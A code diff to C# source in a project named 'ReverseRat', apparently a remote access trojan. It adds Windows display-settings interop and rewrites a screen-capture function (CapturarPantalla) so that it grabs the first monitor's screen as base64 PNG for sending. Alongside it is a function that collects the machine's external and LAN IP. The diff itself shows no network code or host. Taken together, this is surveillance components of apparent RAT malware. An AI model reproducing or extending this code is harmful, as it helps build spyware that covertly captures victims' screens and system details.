@@ -7,9 +7,10 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 
+
+
 namespace ReverseRat
 {
-
 
     class IniFile   // revision 11
     {
@@ -61,7 +62,55 @@ namespace ReverseRat
     class Funciones
     {
 
-       public static string HashServer = "";
+        const int ENUM_CURRENT_SETTINGS = -1;
+
+        // Declaraciones necesarias para tomar Screenshot de la pantalla
+        [DllImport("user32.dll")]
+        public static extern bool EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct DEVMODE
+        {
+            private const int CCHDEVICENAME = 0x20;
+            private const int CCHFORMNAME = 0x20;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
+            public string dmDeviceName;
+            public short dmSpecVersion;
+            public short dmDriverVersion;
+            public short dmSize;
+            public short dmDriverExtra;
+            public int dmFields;
+            public int dmPositionX;
+            public int dmPositionY;
+            public ScreenOrientation dmDisplayOrientation;
+            public int dmDisplayFixedOutput;
+            public short dmColor;
+            public short dmDuplex;
+            public short dmYResolution;
+            public short dmTTOption;
+            public short dmCollate;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
+            public string dmFormName;
+            public short dmLogPixels;
+            public int dmBitsPerPel;
+            public int dmPelsWidth;
+            public int dmPelsHeight;
+            public int dmDisplayFlags;
+            public int dmDisplayFrequency;
+            public int dmICMMethod;
+            public int dmICMIntent;
+            public int dmMediaType;
+            public int dmDitherType;
+            public int dmReserved1;
+            public int dmReserved2;
+            public int dmPanningWidth;
+            public int dmPanningHeight;
+        }
+    
+
+
+
+    public static string HashServer = "";
        public string ObtenerIp() // IP Externa y Lan
         {
             string ipExterna = "";
@@ -196,27 +245,36 @@ namespace ReverseRat
         }
 
 
-       public  string CapturarPantalla()
+       public string CapturarPantalla() // Screen shot de primer monitor, enviar info como png
         {
-            string base64String;
-            // Obtener el tamaño de la pantalla
-            var screenBounds = Screen.PrimaryScreen.Bounds;
-            // Crear un bitmap con el tamaño de la pantalla
-            var bitmap = new Bitmap(screenBounds.Width, screenBounds.Height);
-            // Crear un objeto Graphics a partir del bitmap
-            var graphics = Graphics.FromImage(bitmap);
-            // Copiar la pantalla en el objeto Graphics
-            graphics.CopyFromScreen(0, 0, 0, 0, screenBounds.Size);
-            // Crear un MemoryStream para guardar la imagen
-            using (var stream = new MemoryStream())
+            string base64String = "";
+
+
+            foreach (Screen screen in Screen.AllScreens)
             {
-                // Guardar la imagen en el MemoryStream en formato PNG
-                bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
-                // Crear un arreglo de bytes con los datos del MemoryStream
-                var imageBytes = stream.ToArray();
-                base64String = Convert.ToBase64String(imageBytes);
-                Console.WriteLine("Captura de pantalla guardada");
+                DEVMODE dm = new DEVMODE();
+                dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
+                EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);
+
+                using (Bitmap bitmap = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bitmap.Size);
+
+                    using (var stream = new MemoryStream())
+                    {
+                        // Guardar la imagen en el MemoryStream en formato PNG
+                        bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
+                        // Crear un arreglo de bytes con los datos del MemoryStream
+                        var imageBytes = stream.ToArray();
+                        base64String = Convert.ToBase64String(imageBytes);
+                        Console.WriteLine("Captura de pantalla guardada");
+                    }
+                }
+                break;            
             }
+
+            // Crear un MemoryStream para guardar la imagen           
             return base64String;
         }
 
